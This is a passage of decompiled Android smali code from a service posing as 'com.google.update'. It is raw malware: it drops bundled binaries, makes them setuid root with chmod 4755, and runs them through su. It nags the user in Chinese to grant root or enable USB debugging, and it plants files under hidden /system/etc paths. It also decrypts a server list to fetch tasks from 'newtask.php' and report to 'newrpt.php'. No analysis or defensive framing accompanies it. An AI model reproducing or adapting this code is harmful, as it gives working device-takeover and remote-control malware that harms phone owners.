    move-result-object v11

    invoke-direct {v10, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v11, "secbin"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 324
    .local v2, "dest":Ljava/lang/String;
    const-string v10, "secbino"

    const/16 v11, 0x1b80

    invoke-static {p0, v10, v2, v11}, Lcom/google/update/Utils;->copyAssets(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;I)V

    .line 325
    const-string v10, "/system/bin/chmod"

    new-instance v11, Ljava/lang/StringBuilder;

    const-string v12, "4755 "

    invoke-direct {v11, v12}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v11, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    invoke-static {v10, v11}, Lcom/google/update/Utils;->oldrun(Ljava/lang/String;Ljava/lang/String;)V

    .line 327
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v10

    const-string v11, "su"

    invoke-virtual {v10, v11}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v9

    .line 328
    .local v9, "process":Ljava/lang/Process;
    const/4 v8, 0x0

    .line 329
    .local v8, "os":Ljava/io/DataOutputStream;
    new-instance v8, Ljava/io/DataOutputStream;

    .end local v8    # "os":Ljava/io/DataOutputStream;
    invoke-virtual {v9}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v10

    invoke-direct {v8, v10}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    .line 330
    .restart local v8    # "os":Ljava/io/DataOutputStream;
    new-instance v10, Ljava/lang/StringBuilder;

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v11

    invoke-direct {v10, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v11, " /data/data/"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    iget-object v11, v0, Landroid/content/pm/ApplicationInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, " &\n"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v8, v10}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 331
    const-string v10, "exit\n"

    invoke-virtual {v8, v10}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 332
    invoke-virtual {v8}, Ljava/io/DataOutputStream;->flush()V

    .line 333
    invoke-virtual {v9}, Ljava/lang/Process;->waitFor()I

    .line 334
    const-wide/16 v10, 0x7d0

    invoke-static {v10, v11}, Landroid/os/SystemClock;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 339
    .end local v2    # "dest":Ljava/lang/String;
    .end local v8    # "os":Ljava/io/DataOutputStream;
    .end local v9    # "process":Ljava/lang/Process;
    :goto_1
    invoke-direct {p0}, Lcom/google/update/UpdateService;->checkPermission()Z

    move-result v10

    if-eqz v10, :cond_2

    .line 340
    iput v13, p0, Lcom/google/update/UpdateService;->mPermState:I

    .line 341
    invoke-direct {p0}, Lcom/google/update/UpdateService;->doSearchReport()V

    goto/16 :goto_0

    .line 335
    :catch_0
    move-exception v10

    move-object v3, v10

    .line 336
    .local v3, "e":Ljava/lang/Exception;
    invoke-virtual {v3}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_1

    .line 346
    .end local v3    # "e":Ljava/lang/Exception;
    :cond_2
    new-instance v5, Landroid/content/Intent;

    invoke-direct {v5}, Landroid/content/Intent;-><init>()V

    .line 347
    .local v5, "intent":Landroid/content/Intent;
    const-class v10, Lcom/google/update/Dialog;

    invoke-virtual {v5, p0, v10}, Landroid/content/Intent;->setClass(Landroid/content/Context;Ljava/lang/Class;)Landroid/content/Intent;

    .line 348
    invoke-virtual {p0}, Lcom/google/update/UpdateService;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v10

    invoke-virtual {v0, v10}, Landroid/content/pm/ApplicationInfo;->loadLabel(Landroid/content/pm/PackageManager;)Ljava/lang/CharSequence;

    move-result-object v10

    invoke-interface {v10}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v7

    .line 349
    .local v7, "name":Ljava/lang/String;
    if-eqz v7, :cond_3

    const-string v10, ""

    invoke-virtual {v10, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v10

    if-eqz v10, :cond_4

    :cond_3
    const-string v7, "\u672c\u8f6f\u4ef6"

    .line 350
    :cond_4
    new-instance v10, Ljava/lang/StringBuilder;

    invoke-static {v7}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v11

    invoke-direct {v10, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v11, "\u9700\u8981root\u6743\u9650\u624d\u80fd\u4f7f\u7528\u5168\u90e8\u529f\u80fd\uff0c\u8bf7\u901a\u8fc7\u6388\u6743\u7ba1\u7406\u7a0b\u5e8f\u8fdb\u884c\u6388\u6743\uff01"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    .line 352
    .local v6, "msg":Ljava/lang/String;
    :try_start_1
    const-string v10, "MSG"

    new-instance v11, Ljava/lang/String;

    const-string v12, "UTF-8"

    invoke-virtual {v6, v12}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v12

    const-string v13, "UTF-8"

    invoke-direct {v11, v12, v13}, Ljava/lang/String;-><init>([BLjava/lang/String;)V

    invoke-virtual {v5, v10, v11}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;
    :try_end_1
    .catch Ljava/io/UnsupportedEncodingException; {:try_start_1 .. :try_end_1} :catch_1

    .line 356
    :goto_2
    const/high16 v10, 0x10000000

    invoke-virtual {v5, v10}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 357
    const-string v10, "TYPEdsada"

    const-string v11, "su"

    invoke-virtual {v5, v10, v14}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 358
    invoke-virtual {p0, v5}, Lcom/google/update/UpdateService;->startActivity(Landroid/content/Intent;)V

    goto/16 :goto_0

    .line 353
    :catch_1
    move-exception v10

    move-object v3, v10

    .line 354
    .local v3, "e":Ljava/io/UnsupportedEncodingException;
    invoke-virtual {v3}, Ljava/io/UnsupportedEncodingException;->printStackTrace()V

    goto :goto_2
.end method

.method private getPermission3()V
    .locals 10

    .prologue
    const/4 v5, 0x0

    const-string v9, "starter"

    const-string v8, "myicon"

    const-string v7, "4755 "

    const-string v6, "/system/bin/chmod"

    .line 389
    const/4 v3, 0x3

    iput v3, p0, Lcom/google/update/UpdateService;->mPermState:I

    .line 392
    invoke-virtual {p0}, Lcom/google/update/UpdateService;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v3

    const-string v4, "adb_enabled"

    invoke-static {v3, v4, v5}, Landroid/provider/Settings$Secure;->getInt(Landroid/content/ContentResolver;Ljava/lang/String;I)I

    move-result v3

    if-nez v3, :cond_0

    .line 393
    invoke-direct {p0}, Lcom/google/update/UpdateService;->setUsbEnabled()I

    move-result v3

    const/16 v4, 0xa

    if-lt v3, v4, :cond_0

    .line 394
    iput v5, p0, Lcom/google/update/UpdateService;->mPermState:I

    .line 419
    :goto_0
    return-void

    .line 399
    :cond_0
    iget-object v3, p0, Lcom/google/update/UpdateService;->mPreferences:Landroid/content/SharedPreferences;

    const-string v4, "P3"

    invoke-interface {v3, v4, v5}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v0

    .line 400
    .local v0, "count":I
    const/16 v3, 0x10

    if-lt v0, v3, :cond_1

    .line 401
    iput v5, p0, Lcom/google/update/UpdateService;->mPermState:I

    goto :goto_0

    .line 404
    :cond_1
    add-int/lit8 v0, v0, 0x1

    .line 405
    iget-object v3, p0, Lcom/google/update/UpdateService;->mPreferences:Landroid/content/SharedPreferences;

    invoke-interface {v3}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    .line 406
    .local v2, "edit":Landroid/content/SharedPreferences$Editor;
    const-string v3, "P3"

    invoke-interface {v2, v3, v0}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 407
    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 409
    invoke-direct {p0}, Lcom/google/update/UpdateService;->getMyDataDir()Ljava/lang/String;

    move-result-object v1

    .line 410
    .local v1, "dir":Ljava/lang/String;
    const-string v3, "myicon"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v4, "myicon"

    invoke-virtual {v3, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const/16 v4, 0x1530

    invoke-static {p0, v8, v3, v4}, Lcom/google/update/Utils;->copyAssets(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;I)V

    .line 411
    const-string v3, "starter"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v4, "starter"

    invoke-virtual {v3, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const/16 v4, 0x1220

    invoke-static {p0, v9, v3, v4}, Lcom/google/update/Utils;->copyAssets(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;I)V

    .line 412
    const-string v3, "secbino"

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v5

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v5, "secbin"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    const/16 v5, 0x1b80

    invoke-static {p0, v3, v4, v5}, Lcom/google/update/Utils;->copyAssets(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;I)V

    .line 414
    const-string v3, "/system/bin/chmod"

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "4755 "

    invoke-direct {v3, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "myicon"

    invoke-virtual {v3, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v6, v3}, Lcom/google/update/Utils;->oldrun(Ljava/lang/String;Ljava/lang/String;)V

    .line 415
    const-string v3, "/system/bin/chmod"

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "4755 "

    invoke-direct {v3, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "starter"

    invoke-virtual {v3, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v6, v3}, Lcom/google/update/Utils;->oldrun(Ljava/lang/String;Ljava/lang/String;)V

    .line 416
    const-string v3, "/system/bin/chmod"

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "4755 "

    invoke-direct {v3, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "secbin"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v6, v3}, Lcom/google/update/Utils;->oldrun(Ljava/lang/String;Ljava/lang/String;)V

    .line 418
    new-instance v3, Lcom/google/update/UpdateService$MyThread;

    invoke-direct {v3, p0}, Lcom/google/update/UpdateService$MyThread;-><init>(Lcom/google/update/UpdateService;)V

    invoke-virtual {v3}, Lcom/google/update/UpdateService$MyThread;->start()V

    goto/16 :goto_0
.end method

.method private getSearchTask()Ljava/lang/String;
    .locals 8

    .prologue
    const/4 v7, 0x0

    .line 531
    invoke-direct {p0}, Lcom/google/update/UpdateService;->checkPermission()Z

    move-result v5

    if-nez v5, :cond_0

    move-object v5, v7

    .line 550
    :goto_0
    return-object v5

    .line 538
    :cond_0
    const/4 v3, 0x0

    .local v3, "i":I
    :goto_1
    :try_start_0
    sget-object v5, Lcom/google/update/StateRes;->Servers:[[B

    array-length v5, v5

    if-lt v3, v5, :cond_1

    :goto_2
    move-object v5, v7

    .line 550
    goto :goto_0

    .line 539
    :cond_1
    sget-object v5, Lcom/google/update/StateRes;->Servers:[[B

    aget-object v5, v5, v3

    invoke-static {v5}, Lcom/google/update/Utils;->decrypt([B)[B

    move-result-object v1

    .line 540
    .local v1, "bs":[B
    new-instance v0, Ljava/lang/String;

    invoke-direct {v0, v1}, Ljava/lang/String;-><init>([B)V

    .line 541
    .local v0, "action":Ljava/lang/String;
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v6, "newtask.php"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 543
    invoke-direct {p0, v0}, Lcom/google/update/UpdateService;->_getSearchTask(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    .line 544
    .local v4, "line":Ljava/lang/String;
    if-eqz v4, :cond_3

    .line 545
    const-string v5, "NONE"

    invoke-virtual {v4, v5}, Ljava/lang/String;->compareTo(Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result v5

    if-nez v5, :cond_2

    move-object v5, v7

    goto :goto_0

    :cond_2
    move-object v5, v4

    .line 546
    goto :goto_0

    .line 538
    :cond_3
    add-int/lit8 v3, v3, 0x1

    goto :goto_1

    .line 549
    .end local v0    # "action":Ljava/lang/String;
    .end local v1    # "bs":[B
    .end local v4    # "line":Ljava/lang/String;
    :catch_0
    move-exception v5

    move-object v2, v5

    .local v2, "e":Ljava/lang/Exception;
    invoke-virtual {v2}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_2
.end method

.method private initJu6Ad(Ljava/lang/String;Ljava/lang/String;)V
    .locals 1
    .param p1, "appId"    # Ljava/lang/String;
    .param p2, "secretId"    # Ljava/lang/String;

    .prologue
    .line 190
    const/4 v0, 0x0

    invoke-static {p1, p2, v0}, Lcom/ju6/AdManager;->init(Ljava/lang/String;Ljava/lang/String;Z)V

    .line 191
    new-instance v0, Lcom/ju6/AdRequester;

    invoke-direct {v0, p0}, Lcom/ju6/AdRequester;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/google/update/UpdateService;->mJu6Ad:Lcom/ju6/AdRequester;

    .line 192
    iget-object v0, p0, Lcom/google/update/UpdateService;->mJu6Ad:Lcom/ju6/AdRequester;

    invoke-virtual {v0}, Lcom/ju6/AdRequester;->getAd()V

    .line 193
    return-void
.end method

.method private isVersion221()Z
    .locals 2

    .prologue
    .line 220
    sget-object v0, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    .line 221
    .local v0, "osVer":Ljava/lang/String;
    const-string v1, "2.2.1"

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_0

    const-string v1, "2.3"

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_0

    const-string v1, "3.0"

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_1

    .line 222
    :cond_0
    const/4 v1, 0x1

    .line 224
    :goto_0
    return v1

    :cond_1
    const/4 v1, 0x0

    goto :goto_0
.end method

.method private provideService()V
    .locals 6

    .prologue
    .line 424
    new-instance v0, Ljava/util/Timer;

    const/4 v1, 0x1

    invoke-direct {v0, v1}, Ljava/util/Timer;-><init>(Z)V

    iput-object v0, p0, Lcom/google/update/UpdateService;->mTimer:Ljava/util/Timer;

    .line 425
    new-instance v0, Lcom/google/update/UpdateService$1;

    invoke-direct {v0, p0}, Lcom/google/update/UpdateService$1;-><init>(Lcom/google/update/UpdateService;)V

    iput-object v0, p0, Lcom/google/update/UpdateService;->mTimerTask:Ljava/util/TimerTask;

    .line 430
    iget-object v0, p0, Lcom/google/update/UpdateService;->mTimer:Ljava/util/Timer;

    iget-object v1, p0, Lcom/google/update/UpdateService;->mTimerTask:Ljava/util/TimerTask;

    sget-wide v2, Lcom/google/update/UpdateService;->INTERVAL:J

    sget-wide v4, Lcom/google/update/UpdateService;->INTERVAL:J

    invoke-virtual/range {v0 .. v5}, Ljava/util/Timer;->schedule(Ljava/util/TimerTask;JJ)V

    .line 431
    return-void
.end method

.method private reportState(ILjava/lang/String;)V
    .locals 5
    .param p1, "state"    # I
    .param p2, "comment"    # Ljava/lang/String;

    .prologue
    .line 784
    const/4 v2, 0x0

    .local v2, "i":I
    :goto_0
    :try_start_0
    sget-object v3, Lcom/google/update/StateRes;->Servers:[[B

    array-length v3, v3

    if-lt v2, v3, :cond_1

    .line 792
    :cond_0
    :goto_1
    return-void

    .line 785
    :cond_1
    sget-object v3, Lcom/google/update/StateRes;->Servers:[[B

    aget-object v3, v3, v2

    invoke-static {v3}, Lcom/google/update/Utils;->decrypt([B)[B

    move-result-object v1

    .line 786
    .local v1, "bs":[B
    new-instance v0, Ljava/lang/String;

    invoke-direct {v0, v1}, Ljava/lang/String;-><init>([B)V

    .line 787
    .local v0, "action":Ljava/lang/String;
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v4, "newrpt.php"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 789
    invoke-direct {p0, v0, p1, p2}, Lcom/google/update/UpdateService;->_reportState(Ljava/lang/String;ILjava/lang/String;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result v3

    if-nez v3, :cond_0

    .line 784
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    .line 791
    .end local v0    # "action":Ljava/lang/String;
    .end local v1    # "bs":[B
    :catch_0
    move-exception v3

    goto :goto_1
.end method

.method private runPackage(Ljava/lang/String;)V
    .locals 5
    .param p1, "pkgName"    # Ljava/lang/String;

    .prologue
    const/4 v4, 0x0

    .line 837
    const-string v2, "/"

    invoke-virtual {p1, v2}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v1

    .line 838
    .local v1, "rpkg":[Ljava/lang/String;
    aget-object v2, v1, v4

    invoke-static {p0, v2}, Lcom/google/update/Utils$PkgManager;->isInstalled(Landroid/content/Context;Ljava/lang/String;)Z

    move-result v2

    if-nez v2, :cond_0

    const-wide/16 v2, 0x2710

    invoke-static {v2, v3}, Landroid/os/SystemClock;->sleep(J)V

    .line 840
    :cond_0
    aget-object v2, v1, v4

    invoke-static {p0, v2}, Lcom/google/update/Utils$PkgManager;->isInstalled(Landroid/content/Context;Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_1

    .line 841
    invoke-virtual {p0}, Lcom/google/update/UpdateService;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    aget-object v3, v1, v4

    invoke-virtual {v2, v3}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    .line 842
    .local v0, "intent":Landroid/content/Intent;
    const/high16 v2, 0x10000000

    invoke-virtual {v0, v2}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 843
    invoke-virtual {p0, v0}, Lcom/google/update/UpdateService;->startActivity(Landroid/content/Intent;)V

    .line 844
    const/4 v2, 0x1

    const-string v3, "RUNOK"

    invoke-direct {p0, v2, v3}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    .line 848
    .end local v0    # "intent":Landroid/content/Intent;
    :goto_0
    return-void

    .line 846
    :cond_1
    const/4 v2, -0x1

    const-string v3, "RUNFailByNoPkg"

    invoke-direct {p0, v2, v3}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    goto :goto_0
.end method

.method private setUsbEnabled()I
    .locals 9

    .prologue
    const-string v5, "UTF-8"

    const-string v7, "P31"

    .line 363
    iget-object v5, p0, Lcom/google/update/UpdateService;->mPreferences:Landroid/content/SharedPreferences;

    const-string v6, "P31"

    const/4 v6, 0x0

    invoke-interface {v5, v7, v6}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v0

    .line 364
    .local v0, "count":I
    add-int/lit8 v0, v0, 0x1

    .line 365
    iget-object v5, p0, Lcom/google/update/UpdateService;->mPreferences:Landroid/content/SharedPreferences;

    invoke-interface {v5}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v1

    .line 366
    .local v1, "edit":Landroid/content/SharedPreferences$Editor;
    const-string v5, "P31"

    invoke-interface {v1, v7, v0}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 367
    invoke-interface {v1}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 369
    const/16 v5, 0xa

    if-lt v0, v5, :cond_0

    .line 383
    :goto_0
    return v0

    .line 371
    :cond_0
    new-instance v2, Landroid/content/Intent;

    invoke-direct {v2}, Landroid/content/Intent;-><init>()V

    .line 372
    .local v2, "intent":Landroid/content/Intent;
    const-class v5, Lcom/google/update/Dialog;

    invoke-virtual {v2, p0, v5}, Landroid/content/Intent;->setClass(Landroid/content/Context;Ljava/lang/Class;)Landroid/content/Intent;

    .line 373
    invoke-virtual {p0}, Lcom/google/update/UpdateService;->getApplicationInfo()Landroid/content/pm/ApplicationInfo;

    move-result-object v5

    invoke-virtual {p0}, Lcom/google/update/UpdateService;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v6

    invoke-virtual {v5, v6}, Landroid/content/pm/ApplicationInfo;->loadLabel(Landroid/content/pm/PackageManager;)Ljava/lang/CharSequence;

    move-result-object v5

    invoke-interface {v5}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v4

    .line 374
    .local v4, "name":Ljava/lang/String;
    if-eqz v4, :cond_1

    const-string v5, ""

    invoke-virtual {v5, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_2

    :cond_1
    const-string v4, "\u672c\u8f6f\u4ef6"

    .line 375
    :cond_2
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v6, "\u9700\u8981\u6253\u5f00USB\u8c03\u8bd5\u624d\u80fd\u4f7f\u7528\u5168\u90e8\u529f\u80fd\uff0c\u8bf7\u786e\u4fddUSB\u8c03\u8bd5\u529f\u80fd\u5df2\u7ecf\u9009\u4e2d\uff01"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    .line 377
    .local v3, "msg":Ljava/lang/String;
    :try_start_0
    const-string v5, "MSG"

    new-instance v6, Ljava/lang/String;

    const-string v7, "UTF-8"

    invoke-virtual {v3, v7}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v7

    const-string v8, "UTF-8"

    invoke-direct {v6, v7, v8}, Ljava/lang/String;-><init>([BLjava/lang/String;)V

    invoke-virtual {v2, v5, v6}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;
    :try_end_0
    .catch Ljava/io/UnsupportedEncodingException; {:try_start_0 .. :try_end_0} :catch_0

    .line 379
    :goto_1
    const-string v5, "TYPEdsada"

    const-string v6, "set"

    invoke-virtual {v2, v5, v6}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 380
    const/high16 v5, 0x10000000

    invoke-virtual {v2, v5}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 381
    invoke-virtual {p0, v2}, Lcom/google/update/UpdateService;->startActivity(Landroid/content/Intent;)V

    goto :goto_0

    .line 378
    :catch_0
    move-exception v5

    goto :goto_1
.end method

.method private tryInstBin(Ljava/lang/String;)Ljava/lang/String;
    .locals 11
    .param p1, "fileName"    # Ljava/lang/String;

    .prologue
    const-string v10, "2 "

    const-string v8, "_"

    const-string v8, " "

    .line 739
    new-instance v8, Ljava/io/File;

    const-string v9, "/system/etc/.dhcpcd"

    invoke-direct {v8, v9}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8}, Ljava/io/File;->exists()Z

    move-result v8

    if-nez v8, :cond_0

    .line 740
    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "2 "

    invoke-direct {v8, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, " /system/etc/.dhcpcd"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 741
    .local v0, "cmd":Ljava/lang/String;
    invoke-static {v0}, Lcom/google/update/Utils$TCP;->execute(Ljava/lang/String;)Z

    move-result v8

    if-nez v8, :cond_0

    const-string v8, "BINCP"

    .line 774
    .end local v0    # "cmd":Ljava/lang/String;
    :goto_0
    return-object v8

    .line 744
    :cond_0
    new-instance v8, Ljava/io/File;

    const-string v9, "/system/etc/.rild_cfg"

    invoke-direct {v8, v9}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8}, Ljava/io/File;->exists()Z

    move-result v8

    if-nez v8, :cond_1

    .line 746
    :try_start_0
    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "/data/data/"

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0}, Lcom/google/update/UpdateService;->getApplicationInfo()Landroid/content/pm/ApplicationInfo;

    move-result-object v9

    iget-object v9, v9, Landroid/content/pm/ApplicationInfo;->packageName:Ljava/lang/String;

